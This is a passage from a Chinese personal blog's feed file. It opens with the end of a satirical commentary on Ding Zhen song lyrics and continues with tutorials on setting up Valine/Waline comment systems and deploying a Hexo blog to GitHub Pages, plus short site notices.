怎么还有近视？<br>做题家都在被迫做着逼事<br>因为天生命贱 全欠收拾<br>把 eco 人生绝地翻 转这是我的命<br>有人想干我 所以抬高赏金<br>做题家在阴影里发出一声悲鸣<br>没人在意我就扬起镶金的马鞭</p></blockquote><p>这里与 IGS 有相通之处，但这里明着指出了做题家的痛处。攻击性拉满，全曲在此封神。脚踩做题家铺成的道路，却反过来说他们命贱——何等强的攻击性！“我天天抽烟，骑着珍珠”，闲游四方，坐享其成，“怎么还有近视”？这句话比较含蓄，千言万语汇集于此，不易捉摸。而联合后两句则“茅塞顿开”了——做题家被迫做着逼事，这是他们天生的，活该。“做题家在阴影里发出一声悲鸣”，在丁真乃至千千万如他一般“逆袭”的人眼中，做题家的痛苦，他们无法尝到，便只作娱乐欣赏；而千千万资本家的眼中，则又是类似的嵌套。“没人在意我就扬起镶金的马鞭”，荣华富贵，做题家们，你们配吗？这马鞭，真的是骑马的工具吗？这镶金的马鞭，一顿一顿，抽打在做题家们的心里；而于资本家眼中，不过是贵族观赏斗兽场中的奴隶罢了！矛盾再次于事实陈述中无形地加深。</p><blockquote><p>把玩 过的烟杆已经数不清<br>想再去寻找它们却根本没了影<br>童年买的烟杆还有几成新<br>当我癌症晚期 帮我拿好我的烟</p></blockquote><p>夸张的手法能带给人极强的讽刺感。抽过无数的烟，却再也找不到这些烟杆，也暗喻丁真再也找不回成名前的纯真之心；童年的烟杆还有几成新，再次起伏——或许，丁真内心还残留着一点过往的初心。然而，“当我癌症晚期，帮我拿好我的烟”，让大家彻底“失落”——丁真再也不是原来的丁真了（批：一说指不是成名之前的纯真的丁真；一说指丁真的形象在此已全部展现，他也不过是一个任人操控的工具罢了；还有说指丁真在此升华，超越丁真本人，成为了一个抽象化的符号）。</p><blockquote><p>拿烟 拿烟 拿烟 拿烟 拿烟 走上了台阶<br>拿烟 拿烟 拿烟 拿烟 拿烟 吐出口浓烟<br>拿烟 拿烟 拿烟 拿烟 拿烟 再嚼颗槟榔<br>拿烟 拿烟<br>拿烟 拿烟 拿烟 拿烟 拿烟 学不会巴结<br>拿烟 拿烟 拿烟 拿烟 拿烟 吐出口浓烟<br>拿烟 拿烟 拿烟 拿烟 拿烟 再嚼颗槟榔<br>拿烟？拿烟。<br>拿烟？拿烟！</p></blockquote><p>意犹未尽，全曲于此戛然而止。</p><h3 id="尾声">尾声</h3><p>丁真真的是一个手持利剑、脚踩做题家的“犯罪者”吗？</p><p>他也无非是一个提线木偶罢了，是摆在明面上的化身。</p><p>表面的光鲜亮丽，吸引着众人的目光，也让人难以捉摸其背后的情况。</p><p>而真正的“犯罪者”是谁？在座各位一定已经都有了定论。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简洁安全的评论系统 - Valine/Waline 折腾笔记</title>
      <link href="/posts/439348253/"/>
      <url>/posts/439348253/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>由于 Hexo 一类静态博客的自身限制，最终生成的东西本身是无法有过多交互的，不论后端，评论都需要外接。在这之前，我曾见有 giscus、Gittalk 等程序，虽国内也可使用，可需要 GitHub 账户，很显然不符合“即时评论”的要求，因此我将其归为“备选”。浏览一圈下来，简洁的、稳定的，也就只有 Valine 和 Waline 符合我的要求。</p><p>本文对应的环境为</p><blockquote><p>NodeJS -&gt; 18.16.0<br>hexo-cli -&gt; 4.3.1<br>hexo-theme -&gt; Butterfly-4.9.0</p></blockquote><p><strong>国内访问，请提前准备没被 墙 的域名</strong></p><h2 id="一、应用配置【最好二选一】">一、应用配置【最好二选一】</h2><h3 id="Valine-配置">Valine 配置</h3><p>Valine 诞生于 2017 年 8 月，是一款基于 LeanCloud 的快速、简洁且高效的无后端评论系统。所以配置 Valine 只需要去 LeanCloud 注册个账号就能操作，这注册账号有手就行不作解释。</p><p><s>【！如果你的博客面向国内为主，还是去国内站点吧，虽然备案、自备域名什么的很麻烦，但为了你面向的用户，也只能这样。后文会讲到这点</s>】目前该问题已经解决，通过绑定域名或反代的方式可以正常访问评论系统。</p><p>注册后进入控制台，在左下角有两个按钮快速入门和创建应用。点击创建应用，自定义名称（例如 valine），选择开发版，其他默认，点击创建。控制台出现了你刚刚创建的应用，点击这个应用的右上角****图标进入设置界面，之后在数据储存-&gt;结构化数据选项卡中创建 Comment 这一 Class。</p><p>随后找到 valine 开发版下面那栏里的应用 Keys，你会看到 AppID 和 AppKey，这两个是下一步我们需要使用的。</p><p>国内版大同小异，不同的是，国内版需要自备域名，而且还要备案等事。国际版不必绑定域名，地址可以<code>使用设置</code>-&gt;<code>应用凭证</code>-&gt;<code>服务器地址</code>-&gt;<code>REST API 服务器地址</code>。</p><p>但这样会存在一个问题，现在国际版 LeanCloud 提供的 REST API 在大陆不能正常访问。解决方法是过绑定自己域名，之后填写 serverURL/REST API 的地方替换为你在 LeanCloud 项目控制台中绑定的域名以解决（绑定成功会刷新为你设置的域名。Cloudflare 记得关代理，即“仅 DNS”。）</p><h3 id="Waline-配置">Waline 配置</h3><p>很显然，由于 Serverless 的原因，一些数据只能在前端处理后存入后面的数据库。在用户传入数据到存储之前这段过程中存在隐患。Waline 与 Valine 最大的不同就是增加了服务端中间层，解决 Valine 暴露出来的安全问题。</p><p><a style="display: block;text-align: center;" href="https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fwalinejs%2Fwaline%2Ftree%2Fmain%2Fexample" target="_blank" rel="noopener noreferrer"><img src="https://vercel.com/button" alt="Vercel" tabindex="0"><span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"></svg></span></a></p><p>点击这个按钮部署服务端，如果 Vercel 没号的自己注册个就行，推荐 GitHub 注册。</p><p>选个你喜欢的名字，下面的东西看着写就行，之后 Vercel 会帮你初始化好一切（你可能还需要在 GitHub 新建个仓库给 Vercel 用，你自己尝试你就知道了）</p><p>一两分钟后，满屏的烟花会庆祝你部署成功，点击 Go to Dashboard，前往控制台。</p><p>在 Vercel 的 Dashboard 页面点击顶部的 Settings-&gt;Environment Variables 进入环境变量配置页，配置三个环境变量 LEAN_ID, LEAN_KEY 和 LEAN_MASTER_KEY ，前面写名称，后面写数据（就是你先前在 LeanCloud 相应仓库弄的 AppID、AppKey、MasterKey），全部保存。如果你使用 LeanCloud 国内版，请额外配置 LEAN_SERVER 环境变量，值为你绑定好的域名。</p><p>配置完成后点击顶部的 Deployments ，点击最新的一次部署右侧的 Redeploy 按钮进行重新部署以让配置生效。之后 Vercel 会跳转到 Overview 界面开始部署，等待片刻后 STATUS 变成 Ready。点击 Visit ，即可跳转到部署好的网站地址，此地址即为你的服务端地址（serverUrl）</p><p>由于这个“serverUrl”默认为<code>.vercel.app</code>，其在国内无法正常访问，还需在该项目中进入<code>Settings</code>-&gt;<code>Domains</code>添加自己的域名，DNS 服务商那里解析 CNAME 填写下面这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cname-china.vercel-dns.com</span><br></pre></td></tr></table></figure><p>或者填写 A 记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">76.223.126.88</span><br></pre></td></tr></table></figure><p>两边设置完后等待 vercel 项目中域名处刷新成功，之后访问绑定自定义域名后的【serverURL】/ui/register 进行注册，注册的第一个用户即为管理员。</p><blockquote><p>补充：CF 用户在此处可能会出现域名重定向次数过多的问题</p></blockquote><h2 id="二、Hexo-配置">二、Hexo 配置</h2><p>这二者在 Hexo 配置的过程大同小异，引入也比较简单。此处以 Butterfly 为例。</p><p>找到博客根目录的<code>_config.yml</code>和主题文件夹下的<code>_config.butterfly.yml</code>文件（其实这个文件你放在博客根目录下也是没有问题的，后续也可以只修改根目录下的主题配置文件），确保你的<code>_config.yml</code>中【#Extensions】这一条已经启用主题【例如 theme: butterfly】</p><p>之后打开<code>_config.butterfly.yml</code>文件，有以下几处需要修改：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">comments:</span></span><br><span class="line">  <span class="comment"># Up to two comments system, the first will be shown as default</span></span><br><span class="line">  <span class="comment"># Choose: Disqus/Disqusjs/Livere/Gitalk/Valine/Waline/Utterances/Facebook Comments/Twikoo</span></span><br><span class="line">  <span class="attr">use:</span> <span class="string">Waline</span> <span class="comment"># Valine,Disqus</span></span><br><span class="line">  <span class="attr">text:</span> <span class="literal">true</span> <span class="comment"># Display the comment name next to the button</span></span><br><span class="line">  <span class="comment"># lazyload: The comment system will be load when comment element enters the browser&#x27;s viewport.</span></span><br><span class="line">  <span class="comment"># If you set it to true, the comment count will be invalid</span></span><br><span class="line">  <span class="attr">lazyload:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">count:</span> <span class="literal">true</span> <span class="comment"># Display comment count in top_img</span></span><br><span class="line">  <span class="attr">card_post_count:</span> <span class="literal">true</span> <span class="comment"># Display comment count in Home Page</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># valine</span></span><br><span class="line"><span class="comment"># https://valine.js.org</span></span><br><span class="line"><span class="attr">valine:</span></span><br><span class="line">  <span class="attr">appId:</span> <span class="comment"># leancloud app id</span></span><br><span class="line">  <span class="attr">appKey:</span> <span class="comment"># leancloud app key</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="comment"># monsterid ## gravatar style https://valine.js.org/#/avatar</span></span><br><span class="line">  <span class="attr">serverURLs:</span> <span class="comment"># This configuration is suitable for domestic custom domain name users, overseas version will be automatically detected (no need to manually fill in)</span></span><br><span class="line">  <span class="attr">bg:</span> <span class="comment"># valine background</span></span><br><span class="line">  <span class="attr">requiredFields:</span> <span class="comment"># required fields (nick/mail)</span></span><br><span class="line">  <span class="attr">visitor:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">option:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># waline - A simple comment system with backend support fork from Valine</span></span><br><span class="line"><span class="comment"># https://waline.js.org/</span></span><br><span class="line"><span class="attr">waline:</span></span><br><span class="line">  <span class="attr">serverURL:</span> <span class="comment"># Waline server address url. 如果按照本文流程进行，则此处应填写刚才在 Vercel 项目中绑定的那个域名</span></span><br><span class="line">  <span class="attr">bg:</span> <span class="comment"># waline background</span></span><br><span class="line">  <span class="attr">pageview:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">option:</span></span><br><span class="line">   <span class="comment"># locale: &#123;placeholder: &#x27;提示文字&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="string">...</span></span><br><span class="line"></span><br><span class="line"><span class="attr">option:</span></span><br><span class="line">  <span class="attr">valine:</span> <span class="string">https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js</span> <span class="comment"># 这里请务必注意与博客根目录下 package.json 里的版本号对应，不知道或未安装的请前往 Valine 官方文档进行阅读</span></span><br></pre></td></tr></table></figure><p>Waline 的改法与之相似，只需要把上述内容换成 Waline 的部分即可，实在不行就打开你编辑器的 Ctrl+F 搜索一下。option 是另外添加内容，可以不修改。</p><p>修改完，保存，Hexo 三连，完成。</p><p>官方文档：</p><p>Valine -&gt; <a href="https://valine.js.org/" rel="external nofollow noreferrer">https://valine.js.org/</a><br>Waline -&gt; <a href="https://waline.js.org/" rel="external nofollow noreferrer">https://waline.js.org/</a><br>LeanCloud 官方文档 -&gt; <a href="https://docs.leancloud.cn/" rel="external nofollow noreferrer">https://docs.leancloud.cn/</a></p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序 </tag>
            
            <tag> Waline </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>站点评论系统说明</title>
      <link href="/posts/814127131/"/>
      <url>/posts/814127131/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>更新：</p><p>自定义域名投入使用，评论系统现可正常使用。鉴于其部署平台与域名 DNS 服务商在国内故障概率较高，故仍存在突然无法正常使用的风险。</p><hr><p>由于众所周知的原因导致的技术原因，站点的评论系统暂无法对中国大陆访客开放。</p>]]></content>
      
      
      <categories>
          
          <category> 网站公告 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>博客主站将使用 Hexo</title>
      <link href="/posts/3758027416/"/>
      <url>/posts/3758027416/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我自己也难以忍受免费主机的速度与稳定性。稍微费了亿点点时间研究了 Hexo，同步了目前所能找到的文章。以后这个博客将会以 Hexo 为主，PHP 版的我将留作备份使用，本地也会备份。</p><p>怎么说呢，现在开始折腾 Hexo 与 Butterfly 主题了，重新编译看效果，短时间内真的不太好适应。而且我从未使用过这样的静态博客，使用起来有点不顺手，希望以后会变好。</p><p>旧文章陆续搬迁，时间非常混乱，因为我有时记不得某篇文章是某时修改。目前运行时间按 Hexo 站建立时间算，但第一篇 HelloWorld 按我所能找到的文章中最早一篇的时间进行设置。新文章有灵感有空就编，更新频率什么的和以前一样，不会频繁的，这点各位“放心”。</p><hr><p>哪天有机会了一定考虑回到 WordPress/Typecho ╥﹏╥……</p><p>听我的，除非爱折腾/写文语法效果与 Hexo 高度耦合/没钱（例如me）等，否则别用 Hexo、Hugo、Jekyll 这种静态的程序，尤其是对命令一点不懂、只想写作的。如此依赖本地环境，发现个错别字还只能先记着回去打开电脑再改，网络环境推 Git 还有概率上不去，更新个啥需要再次推送，麻烦得要死……</p>]]></content>
      
      
      <categories>
          
          <category> 网站公告 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>开销几乎为零的静态博客：Hexo 折腾记录</title>
      <link href="/posts/2127331844/"/>
      <url>/posts/2127331844/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><details class="toggle" ><summary class="toggle-button" style="">前言，可不看</summary><div class="toggle-content"><p>本文需要一定的动手折腾能力，并且注意备份。</p><p><s>除非你属于爱折腾/写文语法效果与 Hexo 高度耦合/没钱等类型的用户，否则不太建议用这种静态的程序，尤其是对命令一点不懂、只想写作的。WP 用起来非常方便，自定义程度也很高，你使用时遇到 99.9%的问题别人大多早已遇到并给出解决方案，而且能给你省下无数的时间。实在不行还有些平台专门托管 WP 的，也支持绑定域名</s>。博客是以内容为主，和程序没有直接关系，用最顺手的即可。</p></div></details><p>终于，我那个原本使用 PHP 的博客（实际上是基于一个论坛程序通过自己编写主题魔改而来）完蛋了。后来想想那种“免费主机”各种不方便，有时体验稀碎，故被迫更换平台。GitHub Pages 只给静态页面，这下程序也要另选。</p><p>此文将记录个人使用 Hexo 和 GitHub 搭建个人博客遇到的问题与解决方法，以备不时之需。</p><p>本文主要针对 Windows 用户，但 Hexo 配置不一定要在 Windows 系统完成。</p><h2 id="一、安装-Git">一、安装 Git</h2><p>Hexo 基于 Node.js，搭建过程中还需要使用 npm ，好在 Node.js 已自带带和 git，因此先搭建本地操作环境，安装 Node.js 和 Git。</p><blockquote><p>Node.js：<a href="https://nodejs.org/zh-cn" rel="external nofollow noreferrer">https://nodejs.org/zh-cn</a><br>Git：<a href="https://git-scm.com/downloads" rel="external nofollow noreferrer">https://git-scm.com/downloads</a></p></blockquote><p>之后一直下一步（你看得懂可以自行决定）<br>Git 的安装有以下过程：</p><ol><li>声明 GPLv2 协议；</li><li>选择安装目录；</li><li>选择安装组件【从上到下为添加桌面图标、添加到右键大文件支持、检测关联文件（两个选项）、每天检查更新、将配置文件添加到 Windows 终端】【一般最后两个不选，最后一个要配合 Windows Terminal 以发挥其优势】；</li><li>选择开始菜单文件夹；</li><li>选择 Git 默认编辑器，默认是 vim（纯命令，上手较难，但熟练后极其方便）。若不选择 vim，安装后可以到<code>我的电脑</code>-&gt;<code>属性</code>-&gt;<code>高级系统设置</code>-&gt;<code>高级</code>-&gt;<code>环境变量</code>-&gt;<code>系统变量</code>-&gt;<code>Path</code>-&gt;<code>编辑添加</code>配置编辑器信息；</li><li>决定初始化新项目（仓库）的主干名字。第一种是让 Git 自己选择，名字是 master ，但将来可能会改为其他名字；第二种是自定义，默认是 main，也可以改为其他的名字。一般默认第一种；</li><li>配置环境变量。<br>第一种是仅从 Git Bash 使用 Git。这个的意思就是你只能通过 Git 安装后的 Git Bash 来使用 Git ，其他第三方工具均不可。<br>第二种是从命令行以及第三方软件进行 Git。字面意思，比第一种多了第三方工具的支持，比较推荐。<br>第三种是从命令提示符使用 Git 和可选的 Unix 工具。选择这种将覆盖 Windows 工具，不爱折腾的还是选第二种较好；</li><li>选择 SSH 执行文件。选第一种即可；</li><li>https 后端传输。如果你使用 Git 不只是为了探索 GitHub 之类的，选第一种即可；</li><li>配置行位符号转换。<br>签出 Windows 样式，提交 Unix 样式的行结尾。<br>按原样签出，提交 Unix 样式的行结尾。<br>按原样签出，按原样提交。<br>你要看不懂或无所谓的，选第一个就行了。</li><li>配置终端模拟器，这个选第一个就行；</li><li>默认 Git Pull。只是为了运行 Hexo 的话选第一个足够了；</li><li>选择一个凭证帮助程序。此处英文易懂不解释，选第一个；</li><li>额外选项。启用文件系统缓存和启用符号链接。此处自行决定；</li><li>实验性功能。求稳请勿勾选。</li></ol><p>此时你已经安装完成 Git，接下来的 Hexo 操作最好在 Git 中完成。</p><h2 id="二、GitHub-配置">二、GitHub 配置</h2><p>既然要部署到 GitHub 上，需要先注册账户，免费计划足够了。使用邮箱注册 GitHub 账户，选择免费账户（Free），并完成邮件验证。</p><h3 id="创建-Key">创建 Key</h3><p>右键 -&gt; Git Bash Here，设置用户名和邮箱（带上双引号）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;GitHub 用户名&quot;  </span><br><span class="line">git config --global user.email &quot;GitHub 邮箱&quot;  </span><br></pre></td></tr></table></figure><p>创建 SSH 密匙（带上双引号）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;GitHub 邮箱&quot;</span><br></pre></td></tr></table></figure><p>然后一路回车。</p><p><strong>【以上三段在输入时需保留前后英文双引号】</strong></p><h3 id="添加秘钥">添加秘钥</h3><p>勾选显示“隐藏的项目”，进入<code>C:\\Users\\用户名、\.ssh</code>目录，用记事本打开<code>id\_rsa.pub</code>文件并复制里面的内容。</p><p>登陆 GitHub ，进入 Settings 页面，选择左边栏的<code>SSH and GPG keys</code>，点击<code>New SSH key</code>。</p><p>Title 随便取个名字，粘贴复制的<code>id\_rsa.pub</code>内容到 Key 中，点击<code>Add SSH key</code>完成添加。之后打开 Git 输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com </span><br></pre></td></tr></table></figure><p>出现 “Are you sure……”，输入 yes 回车确认。显示 “Hi xxx! You’ve successfully……” 即连接成功。</p><h3 id="创建一个仓库用于部署-Hexo">创建一个仓库用于部署 Hexo</h3><p>右上角，头像加号，New repository，然后仓库名必须为<code>用户名.github.io</code>，否则访问时不是<code>github.io</code>的二级域名。</p><p>有些人想要有多个这样的域名，但一个账户只能有一个，不过一个账户却可以有多个组织。你可以创建个组织，在组织里创建个仓库，此时若希望以域名访问，这个仓库须和组织名相同，和用户名无关（除非你给组织起个相同的名字），也算是一种方法。</p><p>description 选填，下面选择<code>Public</code>，创建 README，完事。之后博客地址为<code>https://用户名。github.io</code>。若想创建<code>组织</code>统一博客项目，则可用地址为<code>https://组织名。github.io</code>。</p><p>总之如果你有域名且打算绑定的，这里仓库怎么命名都行，到时在仓库<code>Setting</code>-&gt;<code>Pages</code>中设置即可。没有域名的、想直接使用 GitHub Pages 提供的域名，直接浏览官方文档：</p><blockquote><p>帐户使用组织的 GitHub Free 或 GitHub Free，存储库必须是公共的。</p><p>如果要创建用户或组织站点，则存储库必须命名为 <code>&lt;user&gt;.github.io</code> 或 <code>&lt;organization&gt;.github.io</code>。 如果您的用户或组织名称包含大写字母，您必须小写字母。</p><p>——<a href="https://docs.github.com/zh/pages/getting-started-with-github-pages/creating-a-github-pages-site" rel="external nofollow noreferrer">创建 GitHub Pages 站点</a></p></blockquote><h2 id="三、本地安装-Hexo">三、本地安装 Hexo</h2><p>在设备里找个顺眼的地方创建个文件夹，起名随意。进入文件夹后右键选择 Git Bash Here ，然后使用 npm 安装 Hexo：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli  </span><br><span class="line">sudo npm install -g hexo-cli【这条是给 Mac 用户的】  </span><br></pre></td></tr></table></figure><p>此处命令可能比较耗时。执行完成后便可开始初始化 Hexo：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo init # 初始化  </span><br><span class="line">npm install # 安装相关组件  </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 完成后输入以下命令：</span></span>  </span><br><span class="line">hexo g # 渲染、编译页面  </span><br><span class="line">hexo s # 启动本地预览</span><br></pre></td></tr></table></figure><p>之后访问<code>http://localhost:4000</code>即可预览。若更换端口（例如更换为<code>7000</code>端口）可输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server -p 7000  </span><br></pre></td></tr></table></figure><h2 id="四、将-Hexo-部署到-GitHub">四、将 Hexo 部署到 GitHub</h2><p>先安装 hexo-deployer-git：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save  </span><br></pre></td></tr></table></figure><p>然后到你存放 Hexo 文件的目录下找到“_confiy.yml”文件，打开，在末尾进行修改：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span>  </span><br><span class="line"><span class="attr">type:</span> <span class="string">git</span> <span class="comment"># 不解释  </span></span><br><span class="line"><span class="attr">repository: git@github.com:</span> [<span class="string">用户名/组织名</span>]<span class="string">.github.io</span> <span class="comment"># 修改相关内容为自己的。此处可直接填写仓库地址，例如&quot;https://github.com/user/repo&quot;也行。</span></span><br><span class="line"><span class="attr">branch:</span> <span class="string">master</span> <span class="comment"># 你可以改为 main 或其他分支  </span></span><br></pre></td></tr></table></figure><p>输入以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d  </span><br></pre></td></tr></table></figure><p>愉快地部署吧！如果你前面配置无误，访问例如<code>https://abc.github.io</code>（abc 替换为前面的<code>用户名</code>或<code>组织名</code>即可访问你的博客。</p><h2 id="五、绑定域名（选）">五、绑定域名（选）</h2><p>这自定义一个域名不更酷吗？追求 SEO 也更方便。域名的话请自行解决，你去买一个也好，整免费的也好，总之这一步你手头得有一个域名。</p><p>域名解析到 DNS 服务商（例如 Cloudflare）后，在 DNS 添加两道解析（保险起见）</p><ol><li><p>A 记录 域名 185.199.110.153【GitHub 的 ip 地址，不嫌麻烦的可以把另外几个地址也解析上】</p></li><li><p>CNAME www 开头域名（写了 www 会自动创建） 上文提到的地址（所以说要有以用户名。<a href="http://github.io" rel="external nofollow noreferrer">github.io</a> 命名的仓库或组织内至少一个以相同格式命名的仓库，能直接通过域名访问）</p></li></ol><p>然后到相应的仓库中，找到 setting 选项卡，在左侧菜单找到 pages 选项卡，选择仓库路径（就是你前面在<code>._config.yml</code> 里写的 master 还是 main 还是其他的）、root。若配置正确，下方会出现让你填写自定义域名的地方。写完后等个几分钟生效，若无则自行检查哪一步有没有问题。</p><p>解析生效后在 Git 中输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean # 清除缓存  </span><br><span class="line">hexo g # 编译渲染  </span><br><span class="line">hexo d # 部署  </span><br></pre></td></tr></table></figure><p>然后使用你的自定义域名看看能不能访问。<br>如果你不希望用组织里的这个仓库，你还可以在组织里另创建一个仓库，在 setting 里【直接带子域名输入】，例如<code>111.abc.com</code>，然后去 DNS 解析商那里加一条 A 记录，名称就是你填的<code>111.abc.com</code>，地址就是你前面填的 GitHub 的 ip。同样的，等待生效。</p><h2 id="六、发布文章">六、发布文章</h2><p>终于完成了基本部署！<br>在终端写文章实在不符合我的习惯，所以安装 hexo-admin：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-admin --save  </span><br></pre></td></tr></table></figure><p>完成后输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s  </span><br></pre></td></tr></table></figure><p>在浏览器打开<code>localhost:4000/admin</code>即可访问（端口号取决于你的自定义，默认不改是 4000）<br>然后 hexo-admin 里面的设置，你看着就会用的，不需要多讲。</p><h2 id="七、更优雅的编辑方式（选）">七、更优雅的编辑方式（选）</h2><h3 id="本地修改即时预览">本地修改即时预览</h3><p>浏览 Hexo 博客时访问的是编译后的静态页面，对于自定义来说，每次修改后需要清空缓存重新编译，比较麻烦。如果我希望修改后立即生效应怎么办？<code>Browsersync</code>就是这样一款浏览器同步测试工具，它能够在 hexo 文件（包括<code>Pug</code>、<code>Stylus</code>、<code>_config.yml</code>等）修改后即刻刷新。</p><p>在<code>【Blogroot】</code>目录下打开 Git 并输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g browser-sync # Mac、Linux 用户若遇到权限不足的问题，可尝试加上“sudo”</span><br></pre></td></tr></table></figure><p>执行完后输入以下命令，能显示对应版本则表示成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browser-sync --version</span><br></pre></td></tr></table></figure><p>什么？无此命令？请尝试 npm 走网络代理线路，或更换为<a href="https://npmmirror.com/" rel="external nofollow noreferrer">taobao 镜像源</a></p><p>安装 hexo 端插件，请执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-browsersync --save</span><br></pre></td></tr></table></figure><p>之后就和原来一样使用 hexo 三连即可，在<code>hexo s</code>执行时修改源文件，不出意外浏览器会自动刷新同步。</p><h3 id="管理面板（以-Hexon-为例）">管理面板（以 Hexon 为例）</h3><p>每次部署还得敲命令，虽然不难但还是麻烦。另外有些虽然操作方便的方案，但我目前没条件或不会安装，所以我在此以 Hexon 为例。地址：<a href="https://github.com/gethexon/hexon" rel="external nofollow noreferrer" title="https://github.com/gethexon/hexon">https://github.com/gethexon/hexon</a>。</p><p>先更换</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npmmirror.com  </span><br><span class="line">npm config set registry http://mirrors.cloud.tencent.com/npm/  </span><br><span class="line">npm config set registry https://mirrors.huaweicloud.com/repository/npm/ # 择其一执行即可 </span><br></pre></td></tr></table></figure><p>然后验证镜像源：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><p>最好把 pnpm 也装一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install pnpm -g  </span><br></pre></td></tr></table></figure><p>在你博客的目录下打开 Git，输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gethexon/hexon --depth 1 </span><br></pre></td></tr></table></figure><p>进入 hexon 目录，执行：</p><figure class="highlight shell"><table><tr><td 